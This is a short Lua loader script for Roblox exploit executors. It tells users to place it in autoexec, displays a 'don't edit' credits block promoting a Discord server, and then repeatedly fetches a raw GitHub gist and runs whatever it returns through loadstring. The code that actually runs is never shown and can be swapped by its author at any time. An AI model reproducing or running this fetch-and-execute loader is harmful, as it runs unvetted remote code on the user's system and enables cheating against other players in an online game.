--v039
--Update: Updated script 6/13/2022
--Put the script in autoexec if your exploit have it, free exploits don't usually.

Credits = [[
    THIS IS CREDITS DON'T TOUCH OR EDIT BECAUSE WITHOUT THIS EXACT CREDITS SCRIPT WON'T WORK
    
    To get the script join Tech Brian discord server
    https://discord.gg/8KqTZVcfCP or discord.io/techbrain
]]

function GetHttp(URL)
	local returning = nil
    repeat
        pcall(function()
            returning = game:HttpGet(URL,true)
        end)
        if returning == nil then
            warn("Failed to get "..URL)
            wait(0.5)
        end
    until returning ~= nil
	return returning
end

got = GetHttp("https://gist.githubusercontent.com/TechyBrain/0cae69c69880daa4355e3c3a46191ae4/raw")
loadstring(got)()